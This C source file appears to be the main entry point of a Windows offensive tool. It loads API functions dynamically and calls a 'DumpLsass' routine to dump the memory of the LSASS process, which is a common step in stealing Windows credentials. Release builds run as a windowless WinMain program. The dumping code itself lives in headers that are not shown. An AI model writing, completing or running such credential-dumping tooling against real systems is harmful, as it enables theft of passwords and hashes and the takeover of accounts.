#include <windows.h>
#include <stdio.h>


#include "LoadAPI.h"
#include "DumpLsass.h"
#include "DebugFunc.h"

#if _DEBUG
int main() {
#else
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
#endif
	API_Call APICall;

	PrintDebug("[-] Loading function API !\n");
	if (!loadApi(&APICall))
		return TRUE;
	if (!DumpLsass(APICall)) {
		PrintDebug("[X] DumpLsass %i!\n", GetLastError());
		PauseDebug();
		return TRUE;
	}
	PrintDebug("[+] lsass dumped successfully!\n");
	PauseDebug();
	return FALSE;
}